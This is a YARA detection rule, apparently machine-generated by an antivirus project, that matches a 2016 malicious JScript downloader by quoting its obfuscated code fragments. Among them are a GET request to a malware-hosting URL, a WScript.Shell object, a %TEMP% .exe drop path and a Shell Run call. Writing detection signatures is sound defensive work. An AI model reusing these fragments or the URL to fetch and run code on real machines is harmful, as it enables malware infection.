rule sig_20160401_45e812db428db83334f19ea1fcf42cb4 {
  meta:
    description = "datamaliciousorder - file 20160401_45e812db428db83334f19ea1fcf42cb4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6752479076663ca6210fa0ea5fb954d4bd41ea0afb6c7c9958857b9a7dc641f6"

  strings:
    $s1  = "EaWo[BvfIwc](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var KbMxt = function EiiJg() {return WScript[GkXda](\"WScript\"+\".Shell\");}(), PtqVhf = 11;" fullword ascii
    $s3  = "function ZmAkg(PlfFmu, WgZa){JbJvb = JbJvb * 1; return PlfFmu - WgZa;};" fullword ascii
    $s4  = "if (EaWo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SzAv(){return IlWdi + \"\";};" fullword ascii
    $s6  = "function CwSb() {return KbMxt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gpghg89U3HL.ex\" + \"e\";};" fullword ascii
    $s7  = "function QyeEdx() {return ((GtNq == true) && (GtNq == JzJrd)) ? 1 : JbJvb;};" fullword ascii
    $s8  = "var GtNq = false;" fullword ascii
    $s9  = "GtNq = true; " fullword ascii
    $s10 = "function OhBcc(){return GkXda;};" fullword ascii
    $s11 = "function SoJw(WsqYcb) {var NntFa = (1, 2, 3, 4, 5, WsqYcb); return NntFa;};" fullword ascii
    $s12 = "return ZmAkg(OskLcx, EknDii);" fullword ascii
    $s13 = "var VebFxm = false;" fullword ascii
    $s14 = "function QgwAxo(DpeMgp){KbMxt[\"R\"+\"un\"](DpeMgp, JbJvb, JbJvb);};" fullword ascii
    $s15 = "var JzJrd = false;" fullword ascii
    $s16 = "}while (ObtCr);" fullword ascii
    $s17 = "var IoyYi = new this[\"Date\"]();" fullword ascii
    $s18 = "function PlKs(){return 23;};" fullword ascii
    $s19 = "JzJrd = true; " fullword ascii
    $s20 = "function JyTr()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}